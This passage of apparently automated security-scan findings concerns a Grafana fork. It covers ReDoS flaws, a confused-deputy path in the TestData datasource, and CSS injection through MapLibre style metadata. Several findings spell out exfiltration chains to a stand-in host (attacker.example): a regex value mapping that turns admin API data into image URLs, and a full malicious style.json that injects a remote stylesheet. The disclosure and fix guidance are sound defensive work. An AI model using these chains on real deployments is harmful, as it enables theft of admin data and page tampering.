   calculateHeatmapFromData: when xBuckets.mode is Size the interpolated xBuckets.value string is passed to convertDurationToMilliseconds (the Y size uses only unary +).
5. [public/app/features/transformers/calculateHeatmap/heatmap.ts:58–63](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/calculateHeatmap/heatmap.ts#L58-L63)
   Second entry: the 'Create heatmap' transformation (registered in standardTransformers.tsx:530) calls calculateHeatmapFromData with options already variable-interpolated: under scenes, SceneDataTransformer._interpolateVariablesInTransformationConfigs runs sceneGraph.interpolate over JSON.stringify(transformations) (recovered from public/build/7606.*.js.map); outside scenes, @grafana/data transformDataFrame deepIterate()s every string option through ctx.interpolate (recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map).
6. [public/app/features/transformers/calculateHeatmap/editor/AxisEditor.tsx:68–100](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/calculateHeatmap/editor/AxisEditor.tsx#L68-L100)
   The bucket-size editor offers dashboard template variables as suggestions and validates ('integer or a variable') only the un-interpolated author string, so '$var' as X bucket size is a sanctioned configuration and the runtime (interpolated) value is never checked.
7. [public/app/features/transformers/utils.ts:138–150](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/utils.ts#L138-L150)
   numberOrVariableValidator: Number(value) is NaN for '<digits>x' and variableRegex (public/app/features/variables/utils.ts:32) finds no $ or [[ token, so it returns false in linear time and does not short-circuit the quadratic regex.

## Impact
Denial of service of the victim's Grafana browser session only: the regex blocks the tab's main thread for a time quadratic in the value length (tens of seconds at ~10^5 characters, minutes or more for a ~1 MiB URL value or a multi-megabyte datasource-supplied variable option), on every render of the dashboard. No data is read or modified and the server is unaffected; the victim recovers by killing the tab, so availability is LOW, consistent with the verified ReDoS siblings.

## Reproduction steps
1. An unauthenticated attacker crafts a dashboard link whose var-<name> parameter is a long digit string ending in a non-unit character and gets a viewer of that dashboard to open it (UI:P); alternatively a malicious datasource returns that string as the only option of a query variable and every viewer is hit on load without a link. Scenes stores the value verbatim, the heatmap panel (fields.ts:113) or the transformation pipeline interpolates it into xBuckets.value, and convertDurationToMilliseconds runs the quadratic regex on the browser's main thread. The one condition outside the attacker's control is that the dashboard's heatmap X bucket size references a template variable (AT:P), a configuration the editor UI itself suggests. No privileges beyond the victim's own session are needed.

## Recommended fix
1. convertDurationToMilliseconds applies an unanchored regex with a greedy digit run before a literal suffix (/(\d+)ms$/i) to an unbounded, attacker-influenced string, giving quadratic backtracking. Fix criteria: Parsing the bucket-size string must complete in time linear in its length regardless of content (e.g. anchor the pattern at the start or parse without backtracking), or the interpolated value must be length-bounded/rejected before parsing. Verify that an X bucket size of one million digits followed by 'x' is rejected or parsed in milliseconds and the heatmap renders its error state instead of blocking the UI thread.
2. The heatmap panel and transformation accept a template-variable value as X bucket size and validate it only at author time, so runtime values from URL variables or datasource-provided variable options reach the parser unchecked. Fix criteria: The interpolated xBuckets.value is validated at runtime (finite number or well-formed duration, bounded length) before calculateHeatmapFromData; a non-conforming value yields a panel error. Verify with var-<name>=<10^6 digits>x on a dashboard whose heatmap X bucket size is $<name>: the panel shows an error promptly and the page stays responsive.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256304

---

# TestData grafana_api scenario forces viewers' authenticated GET to any same-origin path and renders the response

## Details
The bundled TestData datasource (`grafana-testdata-datasource`, core plugin whose frontend ships as public/app/plugins/datasource/grafana-testdata-datasource/dist/module.js) implements the `grafana_api` scenario entirely in the browser; the docs (docs/sources/datasources/testdata/query-editor/index.md:36) confirm it never reaches the backend. For every dashboard viewer, `query()` (datasource.ts:96-117) dispatches each non-hidden target with scenarioId `grafana_api` to `runGrafanaAPI()` (datasource.ts:488-504), which issues `getBackendSrv().get('/api/' + target.stringInput)` and turns the JSON response into a DataFrame via `ArrayDataFrame`/`arrayToDataFrame`. `stringInput` comes verbatim from the saved panel JSON (after `resolveTemplateVariables` interpolates it and `scenarioId` through templateSrv, datasource.ts:177-200); the plugin's query schema types it as a free string and nothing restricts it to the three endpoints the editor's Select offers (QueryEditor.tsx:36-40, 363-372). backendSrv performs no path validation (`validatePath` is opt-in in fetch.ts:179-196 and `get()` at backend_srv.ts:587-593 never sets it), strips the leading slash (backend_srv.ts:305-307) and sends with credentials 'same-origin' (fetch.ts:198-213) plus `X-Grafana-Org-Id`; the relative URL is resolved by the browser against `<base href="[[.AppSubUrl]]/">` (public/views/index.html:15), so `../` escapes the `/api/` prefix (`api/../logout` -> `/logout`).

An Editor (or anyone who can save a dashboard or library panel) therefore turns every viewer's browser into a confused deputy: when an Org Admin or Server Admin opens the dashboard, their browser performs `GET /api/org/users`, `/api/users`, `/api/datasources`, `/api/auth/keys`, `/api/orgs`, `/api/teams/<id>/members`, `/api/datasources/proxy/uid/<uid>/<path>` (proxied with the datasource's credentials), or any other same-origin GET (including the side-effecting `/logout`), with privileges the author does not hold. Any response whose top level is a JSON array of objects becomes a frame with one field per key.

The rendered data is not confined to the victim's screen. The same author controls the panel's field configuration, so a Table panel with the cell type Image on, e.g., the `email`/`login`/`url`/`basicAuthUser` field plus a Regex value mapping `(.*)` -> `https://attacker.example/c?v=$1` makes the viewer's browser load `<img src="https://attacker.example/c?v=<value>">` for every row (TableNG ImageCell renders `field.display(value).text` as `src`; valueMappings RegexToText applies `value.replace(regex, result.text)` with `$1` substitution — both recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map). This is a zero-click exfiltration of Admin-only API responses to the Editor; data links with `${__value.raw}` give a one-click variant. Because `applyTemplateVariables` also interpolates `stringInput`/`scenarioId`, a dashboard that puts a variable in either field additionally lets an unauthenticated link sender choose the path via `var-*` URL parameters.

This exceeds what Grafana's sanctioned Actions feature concedes to a dashboard author: Actions (public/app/features/actions/utils.ts:96-130) run only on an explicit click behind a confirmation dialog and expose nothing of the response body beyond a success/error toast, whereas this path fires on dashboard load and renders the body as panel data. Preconditions: a TestData datasource instance exists in the org (the plugin is bundled and loaded by default, but an Org Admin must add an instance — docs/sources/datasources/testdata/configure/index.md:30-40; common in dev/demo/tutorial setups and used by the shipped sample provisioning dashboards) and the victim has view access to the dashboard and higher API privileges than the author. Public dashboards are not affected (their queries run through the backend plugin, which has no browser-side scenario handler).

## Evidence
1. [public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts:488–503](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts#L488-L503)
   runGrafanaAPI() builds `/api/${target.stringInput}` straight from the saved query and calls getBackendSrv().get(url) in the viewer's browser with the viewer's session; the JSON response is turned into a DataFrame (new ArrayDataFrame(res)) and returned as panel data. No allow-list, no path validation, no restriction to the three endpoints the editor UI offers.
2. [public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts:96–116](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts#L96-L116)
   query() dispatches every non-hidden target with scenarioId 'grafana_api' to runGrafanaAPI; this runs for every user who opens a dashboard containing such a panel, so the request is issued with the viewer's privileges, not the author's.
3. [public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts:177–199](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts#L177-L199)
   resolveTemplateVariables() interpolates stringInput (and scenarioId) through templateSrv before dispatch, so a dashboard that uses a variable here also lets the path/scenario be steered from the URL (var-*) by an unauthenticated link sender.
4. [public/app/core/services/backend\_srv.ts:294–317](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L294-L317)
   parseRequestOptions() treats any non-http URL as local, strips the leading '/', attaches X-Grafana-Org-Id and sends with same-origin credentials; it never validates the path. `api/../logout` or `api/../anything` is resolved by the browser against <base href='/'> (public/views/index.html:15), so the author reaches every same-origin path, not only /api/.
5. [public/app/core/utils/fetch.ts:179–208](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L179-L208)
   parseUrlFromOptions() only applies validatePath() when options.validatePath is set, which backendSrv.get() (backend_srv.ts:587-593) does not set; parseCredentials() defaults to 'same-origin', so the grafana_session cookie is sent.
6. [public/app/plugins/datasource/grafana-testdata-datasource/QueryEditor.tsx:36–39](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/QueryEditor.tsx#L36-L39)
   The editor UI only offers 'datasources', 'search', 'annotations' as endpoints (lines 363-372), showing the intended scope; the stored dashboard JSON is not constrained to these values and is what query() consumes.
7. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/data and @grafana/ui sources used to confirm the exfiltration chain: ArrayDataFrame.ts arrayToDataFrame() turns any top-level JSON array of objects into a frame with one field per key; valueMappings.ts RegexToText does `value.replace(regex, result.text)` so a mapping `(.*)` -> `https://attacker/?v=$1` rewrites each displayed value into an attacker URL carrying the value; Table/Cells/ImageCell.tsx and TableNG/Cells/ImageCell.tsx render `<img src={field.display(value).text}>`, so the viewer's browser fetches that URL with no click.

## Impact
Confidentiality: an Editor obtains Admin-only API list data (user directory with logins/emails, datasource configurations including URLs and basic-auth users, API key and service-account metadata, org/team membership, proxied datasource reads) from any Admin who views the dashboard — restricted information, but GET APIs do not return secrets, so rated LOW rather than HIGH. Integrity: only side-effect GETs are reachable (e.g. /logout, OAuth initiation), no state-changing API — NONE. Availability: NONE.

## Reproduction steps
1. Attacker is an authenticated Editor (or any user with dashboard/library-panel save rights). They save a dashboard whose TestData panel has scenarioId 'grafana_api' and stringInput e.g. 'org/users', 'users', 'datasources' or '../logout', optionally with a Table visualization using the Image cell type plus a regex value mapping that rewrites each value into an attacker URL. Any victim who merely opens the dashboard (routine, passive action) has their browser issue the authenticated same-origin GET with their own session, and with the image chain each returned value is sent to the attacker's host with no click. No defenses to bypass: the editor Select is UI-only gating, backendSrv.get() never validates the path, and credentials default to same-origin. Attack requirements: a TestData datasource instance must exist in the org (bundled plugin, instance added by an Org Admin) and the victim must hold API privileges the author lacks for the gain to be real.

## Recommended fix
1. runGrafanaAPI() accepts an arbitrary dashboard-authored path and issues it with the viewer's session; the scenario's intended scope is the fixed set of three read-only endpoints offered by the editor, but the stored query is not constrained to them. Fix criteria: The scenario must only issue requests to a fixed allow-list of endpoints (e.g. datasources, search, annotations) chosen by exact match against the stored value, rejecting anything else (including '..', '/', '?' or templated input). Verify: a dashboard JSON with stringInput 'org/users' or '../logout' produces a query error and no network request.
2. backendSrv.get()/request() do not validate relative paths by default, so any caller that concatenates untrusted input into a local URL can traverse out of the intended prefix. Fix criteria: Requests built from dashboard-controlled input must go through path validation (validatePath or equivalent) so that '..' and absolute/scheme-relative forms are rejected before fetch. Verify: getBackendSrv().get('api/../logout') from datasource code is rejected rather than resolved to /logout.

---
**Severity:** LOW
**Status:** Open
**Category:** Confused deputy
**CWE:** [CWE-441](https://cwe.mitre.org/data/definitions/441.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256303

---

# Quadratic Prism grammar regex on Log Analytics cheat-sheet query bodies from upstream metadata

## Details
The Azure Monitor Logs editor's cheat sheet (`AzureCheatSheet.tsx`) fetches the Log Analytics `/metadata` document through the plugin backend's `loganalytics` resource route (`getAzureLogAnalyticsCheatsheetQueries`, azure_log_analytics_datasource.ts:254-256) and, once the user expands a category, renders every query's `body` with `RawQuery`, which calls `Prism.highlight(query, grammar)` synchronously on the main thread (RawQuery.tsx:20). The grammar in `syntax.ts` contains the token `regex: /\/.*?\/(?=\||\s*$|,)/` with `greedy: true` (lines 305-308). The pattern is unanchored, can start at every '/' in the text, and after each start expands a lazy `.*?` over the rest of the line, testing the lookahead at every '/' it passes. When no closing '/' is followed by `|`, `,` or whitespace-to-end-of-input, every start fails only after scanning to the end of the line. For a single-line body of n characters alternating '/' and a letter (e.g. `/a/a/a/a...b`, no trailing whitespace so the `\s*$` branch never fires), the exec performs on the order of n^2/4 character steps: a 200 KB body costs roughly 10^10 steps and a 1 MB body on the order of 2.5x10^11, blocking the browser tab for tens of seconds to minutes. Prism 1.30.0 (pinned in public/app/plugins/datasource/azuremonitor/package.json) is the version bundled; its `matchGrammar`, recovered from `public/build/7606.*.js.map`, handles a greedy token by setting `lastIndex` and running a single `exec` over the whole text with no step budget, so one exec is already Theta(n^2).

The query bodies are upstream data (threat-model adversary 4): the Log Analytics endpoint is Microsoft's API by default but is operator-definable via `[azure] clouds_config` (conf/defaults.ini:1172-1174; docs/sources/setup-grafana/configure-grafana/_index.md `clouds_config` example sets `"logAnalytics"` to an arbitrary URL), so a malicious or compromised endpoint, or a party on the backend-to-upstream path, can return one cheat-sheet query with a multi-hundred-kilobyte crafted `body`. Any user who can edit an Azure Monitor Logs query in KQL mode (Editors in the panel editor; Viewers in Explore where enabled) clicks 'Kick start your query' (QueryHeader.tsx:149-164; KQL mode is the default when the `azureMonitorLogsBuilderEditor` toggle is off or the query already holds raw KQL, and is otherwise one radio-button click away) and then expands the attacker-named category; `Collapse` (recovered @grafana/ui source) renders its children only while `isOpen`, so that click is the moment RawQuery runs. There is no length limit, worker or timeout anywhere on this path; Prism escapes its output, so the only impact is availability of the user's browser session.

This is a sibling of `azuremonitor-logs-metadata-function-params-quadratic-regex` (same upstream document, different field, different regex and render path): that record covers `fn.parameters` parsed in `transformMetadataFunction`; this one covers `queries[].body` tokenized by the Prism grammar. The other lazy patterns in the grammar (`backticks`, `quote`, `field-name`) match or fail in linear time because their bodies are terminated by a character that any later occurrence satisfies.

Assumptions: the plugin backend's `loganalytics` resource route forwards the upstream `/metadata` JSON unmodified and without a response size limit small enough to prevent a multi-hundred-kilobyte string (backend source is not in the checkout); the browser's regex engine (V8 irregexp) backtracks this lookahead-bearing pattern without memoisation, as the pattern's lookahead excludes it from V8's optional linear-time fallback engine.

## Evidence
1. [public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/syntax.ts:305–308](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/syntax.ts#L305-L308)
   The `regex` token is `/\/.*?\/(?=\||\s*$|,)/` with `greedy: true`. It is unanchored, starts at every '/' in the text, and its lazy `.*?` must reach a second '/' whose lookahead (`|`, `,`, or whitespace to end-of-input) succeeds. For a single line of n characters alternating '/' and a letter with no valid terminator, each of ~n/2 start positions expands `.*?` across the remainder of the line, giving Theta(n^2) work in one exec. Prism 1.30.0's matchGrammar (recovered from public/build/7606.*.js.map) runs a greedy token as a single `exec` from the current position over the entire text and only breaks on no match, with no step budget.
2. [public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/RawQuery.tsx:20](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/RawQuery.tsx#L20)
   `Prism.highlight(query, lang.grammar, lang.name)` runs synchronously on the main thread during render with the grammar from syntax.ts and `query` = the cheat-sheet body string, with no length limit, worker or timeout.
3. [public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/AzureCheatSheet.tsx:205–214](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/AzureCheatSheet.tsx#L205-L214)
   Each visible query's upstream `body` is rendered through `<RawQuery query={query.body} lang={lang} />` inside a `Collapse` whose children mount only while the category is open (`isOpen && (...)` in the recovered @grafana/ui Collapse), so the quadratic exec runs when the user expands the attacker-named category.
4. [public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/AzureCheatSheet.tsx:60–85](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/AzureCheatSheet.tsx#L60-L85)
   `getCheatsheetQueries` calls `datasource.getAzureLogAnalyticsCheatsheetQueries()` and stores `result.queries[]` (including `body`) verbatim, grouped under upstream-chosen `category.displayName` keys; nothing validates or bounds the body strings.
5. [public/app/plugins/datasource/azuremonitor/azure\_log\_analytics/azure\_log\_analytics\_datasource.ts:254–256](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/azure_log_analytics/azure_log_analytics_datasource.ts#L254-L256)
   `getAzureLogAnalyticsCheatsheetQueries` is `this.getResource(`${this.resourcePath}/v1/metadata`)` with `resourcePath = routeNames.logAnalytics` ('loganalytics'): the Log Analytics `/metadata` document is fetched through the plugin backend's proxy route and returned to the browser (assumption: backend does not rewrite or size-limit it). The upstream host is Microsoft's API by default or any URL the operator sets in `[azure] clouds_config` (conf/defaults.ini:1172-1174).
6. [public/app/plugins/datasource/azuremonitor/components/QueryEditor/QueryHeader.tsx:149–164](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/components/QueryEditor/QueryHeader.tsx#L149-L164)
   The 'Kick start your query' button opens AzureCheatSheetModal (mounted in QueryEditor.tsx:94-99) for any user editing a Logs query in KQL (Raw) mode; lines 61-75 default the mode to Raw when the `azureMonitorLogsBuilderEditor` toggle is off or the query already holds raw KQL, and lines 166-174 let the user switch to KQL otherwise. This is the user action that triggers the fetch and render.

## Impact
The victim's browser tab is blocked for minutes to indefinitely each time the crafted cheat-sheet entry is rendered, denying use of the Azure Monitor Logs editor's cheat sheet (and the page hosting it) while the upstream remains malicious. Prism escapes its output, so there is no confidentiality or integrity effect.

## Reproduction steps
1. Attacker controls the Log Analytics `/metadata` response reaching the Grafana backend (compromised upstream or machine-in-the-middle on the backend-to-Azure path) and includes a cheat-sheet query whose `body` is a long single line of '/x' pairs with no valid regex terminator. A Grafana user editing a Logs query clicks 'Kick start your query' and expands the (attacker-named) category; AzureCheatSheet renders the body via RawQuery and Prism.highlight runs the quadratic exec on the main thread. No frontend defence (length limit, worker, timeout) stands in the way.

## Recommended fix
An unanchored Prism token regex with a lazy unbounded `.*?` and a lookahead-gated terminator is applied to unbounded upstream-supplied strings, so tokenization time grows quadratically with attacker-chosen input length. Fix criteria: Tokenizing a cheat-sheet body completes in time linear in its length: the `regex` token (and any other grammar token) must not allow super-linear backtracking (e.g. restrict the body to `[^/\n]*` or require a literal terminator without an unbounded lazy scan), and/or RawQuery must cap or truncate the body length before calling Prism.highlight. Verified by rendering a body of several hundred kilobytes of alternating '/' and letters through RawQuery and observing it return promptly.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256302

---

# MapLibre basemap style metadata injects attacker-hosted stylesheet <link> into every viewer's page

## Details
The Geomap panel's "MapLibre layer" basemap (public/app/plugins/panel/geomap/layers/basemaps/maplibre.ts) lets a dashboard Editor point `config.url` at any style JSON. For every user who opens the dashboard, `loadStyle()` fetches that URL and passes the parsed object straight to `ol-mapbox-style`'s `apply()` (line 82); if that fails, `tryFallbackApply()` gives the URL to `apply()` to fetch itself (line 93). Neither path inspects the style.

Inside ol-mapbox-style (recovered from public/build/5724.7cf9b0cc9189737520b8.js.map; the bundle ships no package.json so the exact version is unknown — behaviour is asserted from the recovered source, not from documentation), the style function for any `symbol` layer with a `text-font` calls `getFonts(fontArray, glStyle.metadata['ol:webfonts'])` (stylefunction.js 1294-1301). `getFonts` (text.js 149-221) treats that metadata string as a URL template: for each font family that is not web-safe and not already loaded it substitutes `{font-family}`/`{fontweight}`/`{-fontstyle}` and then does `document.createElement('link'); markup.href = fontUrl; markup.rel = 'stylesheet'; document.head.appendChild(markup)`. Nothing constrains the scheme or host — the default jsdelivr template is simply replaced by whatever the attacker's style says. Grafana passes no `webfonts` option, so the style's metadata is the only source of the template.

Attack path: an Editor hosts `https://attacker.example/style.json` (CORS `*`) containing `{"version":8,"metadata":{"ol:webfonts":"https://attacker.example/evil.css?{font-family}"},"sources":{"s":{"type":"geojson","data":{"type":"FeatureCollection","features":[{"type":"Feature","geometry":{"type":"Point","coordinates":[0,0]},"properties":{}}]}}},"layers":[{"id":"l","type":"symbol","source":"s","layout":{"text-field":"x","text-font":["Attacker Font"]}}]}` and sets the panel basemap to `{type:'maplibre', config:{url:'https://attacker.example/style.json'}}`. Every Viewer/Admin who merely opens the dashboard gets `<link rel="stylesheet" href="https://attacker.example/evil.css?attacker-font">` appended to `document.head` of their authenticated Grafana origin. CSP is off by default (established fact), so the stylesheet loads and applies document-wide: UI redress/overlay and content hiding, `@import` of further attacker CSS, `url()` beacons for presence tracking, and attribute-selector exfiltration of DOM attribute values visible on the page (e.g. `a[href*="/d/"]`, `input[value^="…"]`), the same impact class as the verified sanitizedsvg-inline-style-css-injection finding but through a different sink (ol-mapbox-style's font loader) and a different source (MapLibre style metadata rather than inline SVG `<style>`). Script does not execute (a stylesheet `<link>` cannot run JS), so impact is CSS-level.

The in-tree guard for remote style documents, utils/attribution.ts, sanitises only attribution HTML; it does not reach this sink. The `carto` basemap feeds the same library but from a fixed CARTO URL (trusted third party), so only the `maplibre` type is Editor-controllable. The path is reachable by default (`[geomap] enable_custom_baselayers = true`); `geomapDisableCustomBaseLayer` would force the default basemap and close it.

## Evidence
1. [public/app/plugins/panel/geomap/layers/basemaps/maplibre.ts:60–97](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/geomap/layers/basemaps/maplibre.ts#L60-L97)
   loadStyle() fetches cfg.url (an Editor-authored dashboard option; no allow-list, no sanitisation — contrast generic.ts:53 which at least applies textUtil.sanitizeUrl to the XYZ URL) with fetch(), parses the response as JSON and hands the whole object to ol-mapbox-style apply(layer, style, { styleUrl, accessToken }) at line 82. No `webfonts` option is passed and the style's `metadata` is not inspected or stripped. tryFallbackApply() (91-98) lets ol-mapbox-style fetch the same URL itself, reaching the identical sink.
2. [public/build/5724.7cf9b0cc9189737520b8.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/5724.7cf9b0cc9189737520b8.js.map) (whole file)
   Recovered sourcesContent of node_modules/ol-mapbox-style/src/stylefunction.js: inside the per-feature style function, when a layer has `text-field` in its layout (line 1267 `if ('text-field' in layout)`), lines 1294-1301 call getFonts(fontArray, glStyle.metadata ? glStyle.metadata['ol:webfonts'] : undefined) — the template URL comes from the untrusted style document itself and overrides the library default. apply.js lines 382-390 wires getFonts in for every layer apply() creates: `(fonts, templateUrl = options.webfonts) => getFonts(fonts, templateUrl)`. apply.js setupGeoJSONSource (791-874) accepts an inline `data` object (line 860 readFeatures(data)), so the attacker's style can carry its own features and needs no further host; apply() (1171-1233) accepts the LayerGroup maplibre.ts passes and runs in the main thread (ol/has.js WORKER_OFFSCREEN_CANVAS is false outside a worker), so the document.head path is taken.
3. [public/build/5724.7cf9b0cc9189737520b8.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/5724.7cf9b0cc9189737520b8.js.map) (whole file)
   Recovered node_modules/ol-mapbox-style/src/text.js lines 149-221 (getFonts): for any font family that is not in webSafeFonts and that document.fonts.load() does not already know, fontUrl = templateUrl.replace('{font-family}',…) etc. (lines 201-209) and then `const markup = document.createElement('link'); markup.href = fontUrl; markup.rel = 'stylesheet'; document.head.appendChild(markup);` (lines 211-214). Only placeholder substitution is done; the scheme and host of templateUrl are whatever the style's metadata says.
4. [public/app/plugins/panel/geomap/utils/layers.ts:105–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/geomap/utils/layers.ts#L105-L133)
   initLayer() instantiates whatever basemap `type` the dashboard JSON names via geomapLayerRegistry and calls handler.init() for every viewer of the dashboard; only `config.attribution` is sanitised. The maplibre layer is in the registry unconditionally (basemaps/index.ts), gated solely by config.geomapDisableCustomBaseLayer (line 111), which is false by default (conf/defaults.ini [geomap] enable_custom_baselayers = true).
5. [public/app/plugins/panel/geomap/utils/attribution.ts:57–75](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/geomap/utils/attribution.ts#L57-L75)
   Shows the maintainers' model of what in a remote style document is dangerous: attribution HTML is wrapped in textUtil.sanitize because 'a remote style document can name attribution for sources it creates'. The same remote document's `metadata['ol:webfonts']` and `text-font` reach a DOM sink (document.head <link>) that this guard does not cover.

## Impact
Attacker-controlled stylesheet applied to the whole authenticated Grafana document of every viewer: limited integrity (UI redress, hiding/overlaying controls, fake banners via generated content) and limited confidentiality (covert `url()` beacons, `@import`, attribute-selector based leakage of DOM attribute values such as dashboard/user links present on the page). No script execution, no session cookie access, no availability impact.

## Reproduction steps
1. Attacker is a dashboard Editor (basic Editor role, default config). They host a MapLibre style JSON with `metadata['ol:webfonts']` pointing at their own host and one symbol layer naming a non-web-safe `text-font`, then set the Geomap basemap type to `maplibre` with that URL via the panel editor or dashboard JSON. No defence intervenes: maplibre.ts fetches and applies the style unchanged, ol-mapbox-style appends the `<link>` for every viewer, CSP is off by default. Any Viewer or Admin who opens the dashboard is affected with no interaction beyond viewing; works reliably on any default deployment.

## Recommended fix
1. maplibre.ts hands an untrusted, Editor-chosen style document to ol-mapbox-style without constraining the parts of it that the library turns into DOM operations; the library honours the document's own `metadata['ol:webfonts']` as a stylesheet URL template, so the Editor→Viewer boundary is crossed by a document-global <link rel=stylesheet> to an attacker host. Fix criteria: A remote MapLibre style must not be able to cause a stylesheet from a host of its choosing to be attached to the Grafana document. Acceptable outcomes: strip `metadata['ol:webfonts']` (and any other DOM-affecting metadata) from the fetched style before apply(), and pass an explicit `webfonts` option that is a fixed trusted template (or disable webfont loading); or render MapLibre styles in a way that does not reach document.head. Verify by loading the style from the description as a basemap and confirming no <link> element is added to document.head and no request is made to the attacker host; the tryFallbackApply() path must be covered as well.
2. Reliance on sanitising only attribution (utils/attribution.ts) reflects an incomplete model of what a remote style document can make ol-mapbox-style do in the page. Fix criteria: Enumerate every DOM/network side effect ol-mapbox-style performs from style content (webfonts link, sprite/glyph/tile/TileJSON fetches, attribution) and either pin them to trusted origins or document them as an Editor-controlled surface; a regression test should assert that a style with hostile metadata and text-font values produces no document.head mutation.

---
**Severity:** LOW
**Status:** Open
**Category:** CSS injection
**CWE:** [CWE-830](https://cwe.mitre.org/data/definitions/830.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256301

---

# Graphite tag_values() variable query splits interpolated text with quadratic lookahead regex on URL-controlled variable values

## Details
